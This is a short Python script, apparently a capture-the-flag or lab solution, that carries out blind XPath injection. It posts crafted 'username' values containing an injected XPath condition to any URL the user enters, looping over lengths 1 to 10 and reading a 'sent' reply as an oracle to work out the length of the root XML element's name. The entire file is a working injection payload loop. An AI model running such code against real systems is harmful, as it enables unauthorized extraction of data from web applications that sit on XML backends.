import requests
from bs4 import BeautifulSoup

soup = BeautifulSoup
url =  input("What is the URL? ")
for i in range(1, 11):  # Loop from 1 to 10
    username = f"invalid' or string-length(name(/*[1]))={i} and '1'='1"
    params = {'username': username, 'msg': 'hi'}
    response = requests.post(url, data=params)
    data = response.text

    if "sent" in data:
        print("Got it! This payload worked: "+username)
        break
    else:
        print("Testing string-length..")
